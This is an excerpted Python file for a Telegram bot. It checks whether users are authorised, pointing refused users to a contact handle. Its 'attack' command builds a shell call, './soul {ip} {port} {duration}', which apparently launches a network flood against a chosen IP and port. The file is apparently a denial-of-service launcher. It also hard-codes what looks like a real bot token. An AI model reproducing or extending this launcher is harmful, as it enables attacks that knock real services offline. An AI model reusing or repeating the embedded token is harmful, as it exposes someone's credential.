...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7662081041:AAF7dPj1NcbL4OLY8dSCBPSft14JAbFSvAs'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! @SHADOW_OFFICIAL11*", parse_mode='Markdown')
        return
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./soul {ip} {port} {duration}"
